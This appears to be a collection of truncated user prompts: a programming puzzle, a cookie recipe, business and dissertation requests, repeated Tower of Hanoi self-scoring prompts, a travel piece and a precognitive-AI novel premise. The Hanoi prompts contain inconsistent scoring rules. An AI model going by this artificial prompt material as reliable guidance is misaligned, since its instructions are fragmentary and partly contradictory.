Those on the incsension path are already on it. \n\nThis solstice is where we get updated on next steps by our interdimensional councils ~ Zarina\"\n\nPlease write 7 three sentence social media posts that take some of these ideas further and, importantly, are written in the style of this writer."]

The technique involves blowing a very fine wind over the surface of the crystal at various angles to detect boundaries (indicated by molecules that are exposed to the wind). This is repeated with different wind directions and the boundaries observed for each direction are recorded. Your team has already collected the data, but \u2013 as is often the case with applied science \u2013 now the real work, analysis, must begin.\n\nFor a given crystal, you will receive the directions in which wind blew over the surface, and the locations of all boundaries encountered by each of these winds. For a wind blowing in direction (wx, wy), a boundary is defined as a location (x, y) such that a molecule exists at (x, y) and no molecule exists at (x \u2212 wx, y \u2212 wy). Note that for technical reasons wx and wy are not necessarily relatively prime.\n\nThe data might not uniquely determine the structure of the crystal. You must find the two unique structures with the minimal and maximal number of molecules consistent with the observations.\n\nFor example, in the first sample input, nine different molecules are directly encountered by the given winds. There must be a molecule at location (3, 3) because otherwise (4, 2) would be a boundary for the third wind. For similar reasons, there must be molecules at (4, 4) and (5, 5). There cannot be any further molecules as they would result in additional observations for some of the winds.\n\ninput\n\nThe first line of input contains three integers dx, dy, and k, where dx and dy (1 \u2264 dx, dy \u2264 103) are the maximum dimensions of the crystal structure, and k (1 \u2264 k \u2264 10) is the number of times wind was blown over the crystal.\n\nEach of the remaining k lines specifies the data for one wind. These lines each start with two integers wx and wy (-dx \u2264 wx \u2264 dx and -dy \u2264 wy \u2264 dy, but not both zero) denoting the direction of the wind. Then comes an integer b (0 \u2264 b \u2264 105) giving the number of boundaries encountered by this wind. The line finishes with b distinct pairs of integers x, y (1 \u2264 x \u2264 dx and 1 \u2264 y \u2264 dy) listing each observed boundary.\n\nYou may assume the input is consistent with at least one crystal and that no molecules exist outside the specified dimensions.\n\noutput\n\nOutput two textual representations of the crystal structure separated by an empty line. Each structure has dy rows of dx characters, with the top-left corner corresponding to location (1, 1). The first is the structure with the minimal number of molecules consistent with the observations, the second is the maximal one.

The structure of the e-book will be: 1. title page 2. contents 3. methodology 4. market trends 5. suburb selections 6. call to action. The data used in our suburb level market analysis is: sale volume by price segment, median house prices over time, suburb vacancy rates, region vacancy rates, median rent, a social advantage/disadvantage decile, region unemployment rate, weekly household income, household income state decile, % family households, average household size, property type proportion breakdown (i.e. detached house, townhouse, apartment, etc.), age segment breakdown, inventory on market (months of stock on market), ownership type breakdown (i.e. owned outright, mortgaged, rented, etc.). I would like you to produce a 300 words for the methodology section of this ebook, justifying our selection of variables and explaining their relevance to identifying property investment opportunities. Explain the interdependancies of these variables, and also how they interact as measures of supply and demand in a property market.

There are a few key ingredient ratios that truly make them one-of-a-kind. Here\u2019s what you\u2019ll need:\n\nFlour: this recipe uses good old all purpose flour to get the perfect texture. I do NOT recommend swapping flours here.\nBrown butter: the brown butter is what really makes them so unique. The flavor profile is nutty, sweet, toasty and reminiscent of a caramel hazelnut flavor.\nSugar: instead of doing a half-and-half ratio of regular granulated white sugar and brown sugar, I do mostly brown sugar and only a bit of white sugar. The brown sugar helps to keep the cookies softer and chewier in the middle, yet still allows for crispy, delicious edges. Normally I choose dark brown sugar because it has a tiny bit more molasses in the flavoring, which again, helps to achieve an out-of-this-world cookie. Don\u2019t worry though, light brown sugar also works.\nEgg + egg yolk: this recipe calls for 1 egg + an additional 1 egg yolk, which makes all the difference in creating a rich texture and the perfect consistency. Just trust me.\nGreek yogurt: it sounds crazy, but a tiny bit of yogurt helps activate the baking soda so you get moist, lovely dough and amazing, crinkly tops. If you\u2019re out of greek yogurt, try sour cream.\nChocolate chips: another thing that makes this recipe unique is the TWO types of chocolate chips, milk chocolate and semi-sweet. It really just creates more flavor profiles. If you like dark chocolate, then you can do that and semi-sweet. Totally up to you.\nBaking staples: of course, don\u2019t forget the baking soda, salt, and vanilla extract. Learn how to make your own vanilla here! I also like to sprinkle the cookies with fancy sea salt after baking.\nBest Brown Butter Chocolate Chip Cookies in a stack\nCan I make them gluten free?\nUnfortunately, I cannot recommend a good gluten free substitute that will yield the same amazing cookies. Feel free to try out any of my gluten free cookies here.\n\nTips for making perfect brown butter chocolate chip cookies\nWith these simple tips & tricks you\u2019ll make the absolute best cookies every time:\n\nDo not use substitutes. Unless I provide swaps (like sour cream for the greek yogurt) do not substitute other ingredients as the cookies will not turn out the same.\nUse room temp ingredients. After browning your butter, make sure it\u2019s cool enough to touch before adding it to your dough. I usually set it aside to cool for 10-15 minutes before making the recipe. Also, be sure to scrape every bit of brown butter from your pan. You\u2019ll want to make sure your eggs are at room temp, too, so they don\u2019t coagulate with the butter. Simply run the eggs under warm water for about a minute or place them in a bowl of warm water for a few minutes.\nMeasure your flour correctly. Do you know the best way to measure flour without a scale? Get my tips & tricks in this video!\nChill the dough. Yes, this recipe requires you to chill the dough, but I promise it\u2019s worth it. Chilling cookie dough allows the cookies to create a smooth caramel flavor, with crispy brown edges, a chewy interior and crackly tops. This happens because the fat in the recipe (butter) is solid and the sugar also absorbs some of it. Trust me, it\u2019s a game-changer.\nBest Brown Butter Chocolate Chip Cookies in a stack\nHow to freeze cookie dough\nFreezing cookie dough is wonderful because it allows you to prep ahead when you have guests or are throwing a party. I LOVE freezing extra cookie dough because that way I can pop them in the oven whenever I want and it\u2019s great when you want to bring something to a party or to a loved one\u2019s house, but don\u2019t feel like having a baking extravaganza. Here\u2019s how to do it.\n\nAfter the dough is done chilling in the fridge for at least 30 minutes, roll the cookie dough into balls and place them on a cookie sheet lined with parchment paper. Chill the dough in the freezer for 30 minutes. This is known as a flash freeze.\nOnce the cookie dough balls firm up, you can transfer them to a reusable freezer-safe bag or container. Cookie dough will keep well for up to 3 months.\nWhen ready to bake, simply bake cookies as directed in the recipe.

These epic cookies are perfectly crispy on the outside, chewy in the middle, and are, in fact, the BEST cookies you will ever eat.\n\nIngredients\n2 1/4 cup all-purpose flour\n1 teaspoon baking soda\n1/2 teaspoon salt\n1 cup unsalted butter (2 sticks)\n1 1/2 cups packed dark brown sugar\n1/4 cup granulated sugar\n1 large egg + 1 additional egg yolk, at room temperature\n1 tablespoon vanilla extract\n1 tablespoon plain greek yogurt\n3/4 cup semi-sweet chocolate chips\n3/4 cup milk chocolate chips (or sub dark chocolate chips)\nMaldon sea salt, for sprinkling on top\nInstructions\nFirst, brown your butter: add butter to a large saucepan and place over medium heat. The butter will begin to crackle, and then eventually foam. Make sure you whisk constantly during this process. After a couple of minutes, the butter will begin to brown and turn a nice golden amber color on the bottom of the saucepan. Continue to whisk and remove from heat as soon as the butter begins to brown and give off a nutty aroma. Immediately transfer the butter to a medium bowl to prevent burning. Set aside to cool for 10 minutes or until cool enough to touch.\n\nWith an electric mixer, mix the brown butter and sugars until well combined, about 1 minute. Beat in the egg, egg yolk, vanilla, and yogurt until combined. \nIn a separate large bowl, whisk together the flour, baking soda, and salt. Slowly add the dry ingredients to the wet ingredients and beat on low-speed just until combined. Add both chocolate chips and mix on low speed until just incorporated into the dough.\n\nChill your dough for 2 hours in the refrigerator, or up to 12-24 hours. Do not try to speed up this process. The dough needs to chill in order to be perfect.\n\nHelpful tip: If you want to make it easier to bake the cookies, I suggest rolling them into balls BEFORE chilling the dough. That way you can simply place them on the prepared baking sheet and bake! Up to you. I usually put my dough in the fridge for 10 minutes, then I take it out roll them into balls, place on a plate or baking sheet and place in the fridge for another hour or two.\n\nOnce dough is chilled, preheat the oven to 350 degrees F and line a baking sheet with parchment paper. You might need to take out the dough and thaw it out a bit before measuring the dough if it is super hard and you did not already roll the cookie dough into balls. This should take about 20 minutes. Once ready to bake, measure 2 heaping tablespoons of the dough or use a medium cookie scoop. It doesn't have to be perfectly rolled. Place dough balls on cookie sheet, 2 inches apart.\n\nBake the cookies 9-11 minutes or until the edges of the cookies begin to turn golden brown. They will look a bit underdone in the middle, but will continue to cook once out of the oven.\n\nCool the cookies on the sheets for 5 minutes to allow them to set up, then sprinkle each cookie with sea salt. Remove the cooled cookies from the baking sheets and transfer to a wire rack to cool completely. Makes 24-36 cookies.\nRecipe Notes\nSee the full post for tips, tricks, freezing instructions, and more!\n\nRecipe by Monique Volz // Ambitious Kitchen| Photography by Sarah Fennel"]

I'll be telling you specifically Assistant my knowledge and asking you to assist in gathering the info.\n\nAFAIK github, bitbucket, and helix core are all source control services - Can you correct me if I'm wrong? They don't have payment services do they?\n\nSentry is a crash log aggregator that can be plugged into various services - Can you correct me if I'm wrong?\n\nXsolla is the only payment platform that they mentioned.\n\nI'm not sure how up to date your info is, but external payment processing for games is a tricky landscape right now. Epic is in a series of lawsuits with Google and Apple over this exact thing. I believe the latest news is:\n\nIn the case of Epic Games vs. Apple, a federal judge ruled that Apple is breaking the law by forcing people to pay for apps and in-app items through the App Store, where it usually takes a 30% slice of the payment as commission. The judge told Apple to ease up and let in other payment options, within 90 days 1. This means that when you pay for a subscription or an in-app item on your iPhone or iPad, you could get the option to pay through the developer\u2019s own systems 1.\n\nIn the case of Epic Games vs. Google, Epic alleges that Google was worried about Epic setting a precedent by abandoning the Play Store and unleashed a broad effort to keep developers from following the company\u2019s lead \n\ngame developers are now allowed to promote alternative payment options for their apps to customers. This means that studios can now send emails to their customers telling them they can pay for subscriptions or in-game items through their website at a reduced cost, circumventing the need to pay Apple its commission \n\nProbably won't be on apple and google's good side going in this direction, but there's potentially a huge revenue difference\n\nAs far as vendors I've evaluated - I'm familiar with the first party platform payment systems, Steam, Xbox, Playstation, Nintendo, Apple, Google, and Epic and have a considerable amount of experience dealing with fraud, chargebacks and refunds. My experience is unique because I've been a stakeholder for making business decisions as well as an online engineer on the backend implementing the APIs for various payment systems for the platforms.\n\nThe annual spend for first party platforms is typically a flat revenue cut that you pay them. Industry standard is 30%, but there have been some changes in this recently that reduces the rate for groups making less than $1m revenue. External payment platforms will have their pricing plans on their websites, but it can be tricky to evaluate because of knowing the number of requests. There's also an implementation and hosting cost for backend services. \n\nI use Github daily for source control for my current projects - LevelUpEmily the AI Twitch Streamer among others. I haven't used Bitbucket, but my research has shown that Github is superior. Perforce / Helix Core is a better option for game development because of the ability to exclusively check out binary data and the way it handles long term storage of binaries.\n\nYes $500 per hour is still my rate. I have availability in the next few days leading up to the end of the month, so that works for me.\n\nIn the response, I don't want to give away too much information for free, but I want to also convey that I know all of this information.\n\nPlease provide answers to all of the questions and brainstorm the best way to approach the response"]

Finally, calculate the overall score, and assign a grading letter based on the overall score's position within the range of possible scores.\n\nBelow is a list of the dataCode column which is the accessor of the ACF fields for each metric.\ndataCode name\naccoci Accumulated Other Comprehensive Income\nacctPay Accounts Payable\nacctRec Accounts Receivable\nassetsCurrent Current Assets\nassetsNonCurrent Other Assets\nassetTurnover Asset Turnover\nbookVal Book Value\nbusinessAcqDisposals Business Acquisitions & Disposals\nbvps Book Value Per Share\ncapex Capital Expenditure\ncashAndEq Cash and Equivalents\nconsolidatedIncome Consolidated Income\ncostRev Cost of Revenue\ncurrentRatio Current Ratio\ndebt Total Debt\ndebtCurrent Current Debt\ndebtEquity Debt to Equity Ratio\ndebtNonCurrent Non-Current Debt\ndeferredRev Deferred Revenue\ndepamor Depreciation, Amortization & Accretion\ndeposits Deposits\nebit Earning Before Interest & Taxes EBIT\nebitda EBITDA\nebt Earnings before tax\nenterpriseVal Enterprise Value\neps Earnings Per Share\nepsDil Earnings Per Share Diluted\nepsQoQ Earnings Per Share QoQ Growth\nequity Shareholders Equity\nfreeCashFlow Free Cash Flow\nfxRate FX Rate\ngrossMargin Gross Margin\ngrossProfit Gross Profit\nintangibles Intangible Assets\nintexp Interest Expense\ninventory Inventory\ninvestments Investments\ninvestmentsAcqDisposals Investment Acquisitions & Disposals\ninvestmentsCurrent Current Investments\ninvestmentsNonCurrent Non-Current Investments\nissrepayDebt Issuance or Repayment of Debt Securities\nissrepayEquity Issuance or Repayment of Equity\nliabilitiesCurrent Current Liabilities\nliabilitiesNonCurrent Other Liabilities\nlongTermDebtEquity Long-term Debt to Equity\nmarketCap Market Capitalization\nncf Net Cash Flow to Change in Cash & Cash Equivalents\nncff Net Cash Flow from Financing\nncfi Net Cash Flow from Investing\nncfo Net Cash Flow from Operations\nncfx Effect of Exchange Rate Changes on Cash\nnetinc Net Income\nnetIncComStock Net Income Common Stock\nnetIncDiscOps Net Income from Discontinued Operations\nnetMargin Net Margin\nnonControllingInterests Net Income to Non-Controlling Interests\nopex Operating Expenses\nopinc Operating Income\nopMargin Operating Margin\npayDiv Payment of Dividends & Other Cash Distributions\npbRatio Price to Book Ratio\npeRatio Price to Earnings Ratio\npiotroskiFScore Piotroski F-Score\nppeq Property, Plant & Equipment\nprefDVDs Preferred Dividends Income Statement Impact\nprofitMargin Profit Margin\nretainedEarnings Accumulated Retained Earnings or Deficit\nrevenue Revenue\nrevenueQoQ Revenue QoQ Growth\nrnd Research & Development\nroa Return on Assets ROA\nroe Return on Equity ROE\nrps Revenue Per Share\nsbcomp Shared-based Compensation\nsga Selling, General & Administrative\nshareFactor Share Factor\nsharesBasic Shares Outstanding\nshareswa Weighted Average Shares\nshareswaDil Weighted Average Shares Diluted\ntaxAssets Tax Assets\ntaxExp Tax Expense\ntaxLiabilities Tax Liabilities\ntotalAssets Total Assets\ntotalLiabilities Total Liabilities\ntrailingPEG1Y PEG Ratio\n\nThe acf field to update is called markethd\\_grade.

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]Value: 1. The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nRule Checking: repeat all the rules.\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Execute and move on to the next.\n\nGo back to Stage 1 and plan for the next move.\n\nNow let's try the following game:\n\nInitial state:\n\n```\nRod A: [3]\nRod B:\nRod C: [2,1]\n```\n\nGoal state:\n```\nRod A: \nRod B: \nRod C: [3, 2, 1]\n```"]

If you're like me, you'll want to make the most of your three days in this picturesque region. So buckle up, grab your wine glass, and let's dive into the sarcastic side of Naramata.\nDay 1: Arrival in Naramata\nThe journey from Vancouver to Naramata is a long and winding one, but it's worth it. The scenery alone is enough to make you forget about the traffic and the noise of the city. As I pull into town, I can't help but feel a sense of peace and relaxation.\nFirst up on the agenda is a visit to the charming JoieFarm Winery. The staff here is always friendly and welcoming, and the wines are outstanding. But let's be real, we're here for the pizza. That's right, JoieFarm has a wood-fired pizza oven and the pies are to die for. So grab a glass of your favorite wine and settle in for a relaxing and delicious meal.\nDay 2: Exploring Naramata's Wine Country\nAfter a restful night's sleep, it's time to get out and explore. And what better way to do that than by bike? That's right, rent a bike and cruise around Naramata's scenic backroads. And of course, make sure to stop at some wineries along the way.\nFirst up is the charming Little Engine Wines. The staff here is knowledgeable and friendly, and the wines are exceptional. But let's be real, we're here for the view. The patio at Little Engine is the perfect spot to soak in the beauty of the region while sipping on a glass of wine.\nNext on the list is the always delightful Poplar Grove Winery. The staff here is always welcoming and the wines are top-notch. But let's be real, we're here for the cheese. Poplar Grove has a cheese shop on-site, and their selection of artisanal cheeses is out of this world. So grab a glass of wine and a cheese board and indulge in the finer things in life.\nDay 3: Time to Relax and Recharge\nAfter two days of wine tasting and adventure, it's time to relax and recharge. And what better way to do that than with a visit to the spa at Naramata Heritage Inn & Spa? Indulge in a massage, soak in the hot tub, and let the stress of the city melt away.\nAs the sun sets on my final day in Naramata, I can't help but feel grateful for the serenity and beauty of this region. And the wine? Well, let's just say it's not bad either.\nSo if you're looking to escape Vancouver and embrace the beauty of Naramata's wine country, just remember to bring your sarcastic wit and a sense of humor. And of course, don't forget to drink some exceptional wine along the way. Cheers!"]

My name is Dimitris Giraleas and I am assigned to be your dissertation supervisor for your final dissertation project.\n\n \n\nTo that end, I\u2019d like to invite you all to an introductory meeting, where I will be discussing the process, how to start and how to start thinking about structing your dissertation. I will sent out the invitation for the MS Teams meeting right after this email.\n\n \n\nOne of the first things you will need to do for your dissertation project is to write a project proposal. The proposal need not be long (half a page to a page) and will need to cover:\n\n \n\nWhat is the topic of the dissertation (what is the system that you want to examine)?\nWhat is the problem/issue (what is the business question) and why is this relevant/important?\nHow are you going to tackle the problem/issue? (what are the methodologies/theories/approaches that can be applied to explore the issue)\n \n\nRemember that the requirements for the dissertation are that it needs to be quantitative in nature and relating to a business-related issue. I\u2019m happy to relax these requirements in principle, and I will accept project proposals that also relate to Soft OR and/or are relating to a specific aspect of Analytics approached from a more theoretical perspective. Note that dissertations that relate to theory are typically much harder to do at a satisfactory level relative to business-related projects.\n\n \n\nTalk to you soon,\n\nI'm trying to do my dissertation in credit risk modelling on the following data:\nAs part of a larger effort to increase transparency, Freddie Mac is making available loan-level credit performance data on all mortgages that the company purchased or guaranteed from 1999 to 2022.\n\nThe availability of this data will help investors build more accurate credit performance models in support of ongoing risk sharing initiatives highlighted by our regulator, the Federal Housing Finance Agency in the 2023 conservatorship scorecard\u200bpdf.\n\nThe Standard and Non-Standard datasets cover approximately 51.4 million mortgages originated between January 1, 1999 and June 30, 2022. Monthly loan performance data, including credit performance information up to and including property disposition, is being disclosed through September 30, 2022. Specific credit performance information in the dataset includes voluntary prepayments and loans that were Foreclosure Alternatives and REOs. Specific actual loss data in the dataset includes net sales proceeds, MI recoveries, non-MI recoveries, expenses, current deferred UPB, and due date of last paid installment.\n\nThe information in the historical dataset is unaudited and subject to change. Freddie Mac cannot guarantee the dataset is complete or error free. Read our disclaimer. The historical dataset is not to be construed as securities disclosure.\n\nIn addition, Freddie Mac requires a licensing agreement\u200bpdf for commercial redistribution of the data in its Single-Family Loan-Level Dataset. Use of the dataset continues to be free for non-commercial, academic/research and for limited use, subject to the applicable terms and conditions.\n\nCan you write me a sample proposal as asked by my professor"]

So if it goes down or has issues, it\u2019s a big deal.\n - The ETA score is generated by a service which you are the PM of.

We want to be able to automatically wake up an engineer in the middle of the night if we detect an outage.\n\ud83d\udccc For the candidate to clarify through questions:\n\n- We\u2019re not interested in fixing the issue or in root cause analysis\n- We can assume there\u2019s a working alerting system e.g. Pagerduty\n- We don\u2019t want to use any other data sources, just the ticket data\n\n\\*\\*\\*End of Question\\*\\*\\*"]

Therefore, they must work with VITA.\n- There is one RCD that i have not been able to present to the CRF. This RCD was submitted late and is missing critical information to do the evaluation .I have requested the MSI to kick it back and inform the vendor that they need to use the right form and fill this information properly. The MSI acknowledges that this delivery was not properly done but seem to believe i should go head with the evaluation since the vendor will most likely fail. I do not feel comfortable with that approach based on the fallout from the last evaluation.

Their multiple becomes a benchmark; company name is used in startup decks.\n\n- Track record for everyone on cap table: Earlier stage VCs get their \"fund returner\". DPI (\"Distributions to Paid in\") goes through the roof; at this point, a fund becomes successful. VCs get a significant boost to their track record, and it becomes much easier for them to raise the next fund. Angels who invested in that company get great track record to help them start new funds.\n\n- Liquidity: VCs that recycle capital now have capital available to invest, without need to fundraise. Angels might have lifechanging capital and can start investing much larger checks. LPs get distributions and can invest in more VC funds.\n\n- Employees becoming LPs: typically, pre-IPO employees have little savings and can't participate in venture ecosystem, unlike big tech (FAANG and alike) employees who are often angels and LPs. Now, at once, we're getting hundreds or thousands of newly rich people who want to \"give back\" to the ecosystem that made them rich.\n\nWhen IPO season starts again in earnest, we'll see many more new VC funds crop up everywhere. I know quite a few great new fund managers that have way smaller funds than they could just because too many potential LPs say, \"I love your fund, and I would definitely invest, I just don't have liquidity right now - need to wait for an IPO\". \n\nI don't know when this IPO traffic jam will start clearing up. But when it does, I expect it will be much easier to fundraise for both funds and startups.\n=="]

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move and prompt me for feedback. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Learn from Feedback.\n\nI will give you some feedback regarding your self-rated moves and states, and please take it into consideration when you are making future evaluations."]

I wrote multiple short stories from a Reddit thread.\n\nHere's one example:\n\nReddit user zoozla shared a story about working on a massive Java monolith that was part of the foreign exchange system used by banks to trade currency. The codebase featured a dizzying 8 layers of abstract classes with just one concrete class at the bottom. It also contained an almost Turing-complete language in XML for parsing legacy binary files. To make matters worse, running the unit tests modified the dev database, requiring manual reseeding after each run. Zoozla spent months attempting to refactor the worst parts of the code, but with little success.\n\nHere is another example:\n\nShnorkylutyun experienced the nightmares of nested generics and wrappers around every possible base type in a Java app. There were mappings between the wrappers and different types of wrappers, along with generic classes describing generic forms with 10+ fields, each with separate generics for every field's type. Form wizards with up to 6 generic types per page only added to the chaos. Rearranging the order of two fields in a form was a cause for celebration if both were Strings.\n\nI'd like to add an intro to each story describing the (faulty) process that lead to the awful state the code is at. I'd like to show the original developers had the best of intentions, but lacked foresight, or knowledge, just cruft accumulated over the years.\n\nHere's an possible intro for the first example:\n\n\"There is no problem that can't be solved by adding another layer of abstraction\" goes the adage. Indeed it is hard to resist the urge to organize code into neat abstraction levels that make for great high level diagrams and offer a clear API. Well that's the theory at least. In practice, all abstractions tend to leak heavily, tend to pile up - abstracting away the important bits of code you're actually looking for, and turn simple debugging an arduous journey of navigating the memory palace of novel classes and objects.\n\nWrite an intro to the second example."]

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]Value: 1. The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nRule Checking: repeat all the rules.\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Recall the rules:\n - Rule 1: Only one disk may be moved at a time.\n - Rule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n - Rule 3: No disk may be placed on top of a disk that is smaller than it.\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Execute and move on to the next.\n\nGo back to Stage 1 and plan for the next move.\n\nNow let's try the following game:\n\nInitial state:\n\n```\nRod A: [3]\nRod B:\nRod C: [2,1]\n```\n\nGoal state:\n\n```\nRod A: \nRod B: \nRod C: [3, 2, 1]\n```"]

The idea revolves around a cybernetic AI system powered via precognition through a blockchain associative remote viewing game, a game with minimal UI that people of all languages can play (as long as they have internet. This allows the decentralized AI to tell people to spend their money on specific things which the precognitive mechanism detects will steer the future in a positive manner.

Blockchain ARV games are a form of decentralized prediction market that uses human intuition to forecast future events. DAOs (Decentralized Autonomous Organizations) are organizations run by rules encoded as computer programs on a blockchain. Direct democracy is a form of democracy in which people decide on policy initiatives directly, rather than through representatives.\n\nThought: Based on my understanding of these concepts, I can now create a solution for the novel by connecting the key components in a coherent manner.\n\nThought: The solution must involve a cybernetic AI system, powered by a blockchain ARV game, that allows for the redistribution of wealth while ensuring unbiased decision-making through human input.\n\nSolution:\n\nIn the novel, the AI system, called Ethos,\n```"]

